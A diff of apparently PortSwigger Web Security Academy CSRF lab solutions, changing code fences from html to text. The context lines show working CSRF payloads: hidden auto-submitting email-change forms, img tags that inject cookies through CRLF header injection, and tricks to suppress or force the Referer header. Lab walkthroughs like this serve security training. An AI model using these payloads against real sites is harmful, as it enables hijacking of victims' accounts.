@@ -55,7 +55,7 @@ An attacker needs to craft some HTML that uses a CSRF attack to change the viewe
 
 Alternatively, if you're using Burp Suite Community Edition, use the following HTML template. You can get the request URL by right-clicking and selecting "Copy URL".
 
-```html
+```text
 <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="anything%40web-security-academy.net">
 </form>
@@ -89,7 +89,7 @@ An attacker needs to use the exploit server to host an HTML page that uses a CSR
 
 Alternatively, if you're using Burp Suite Community Edition, use the following HTML template. You can get the request URL by right-clicking and selecting "Copy URL".
 
-```html
+```text
 <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="$param1name" value="$param1value">
 </form>
@@ -152,7 +152,7 @@ An attacker needs to use the exploit server to host an HTML page that uses a CSR
 8. Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab (above), ensuring that you include your CSRF token. The exploit should be created from the email change request.
 9. Remove the auto-submit `script` block, and instead add the following code to inject the cookie:
 
-```html
+```text
 <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
 ```
 
@@ -184,7 +184,7 @@ An attacker needs to use the exploit server to host an HTML page that uses a CSR
 5. Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab (above), ensuring that your CSRF token is set to "fake". The exploit should be created from the email change request.
 6. Remove the auto-submit `script` block and instead add the following code to inject the cookie and submit the form:
 
-```html
+```text
 <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
 ```
 
@@ -209,7 +209,7 @@ An attacker needs to use the exploit server to host an HTML page that uses a CSR
 3. Delete the Referer header entirely and observe that the request is now accepted.
 4. Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab (above). Include the following HTML to suppress the Referer header:
 
-```html
+```text
 <meta name="referrer" content="no-referrer">
 ```
 
@@ -248,7 +248,7 @@ This will cause the Referer header in the generated request to contain the URL o
 
 6. If you store the exploit and test it by clicking "View exploit", you may encounter the "invalid Referer header" error again. This is because many browsers now strip the query string from the Referer header by default as a security measure. To override this behaviour and ensure that the full URL is included in the request, go back to the exploit server and add the following header to the "Head" section:
 
-```html
+```text
 Referrer-Policy: unsafe-url
 ```
     
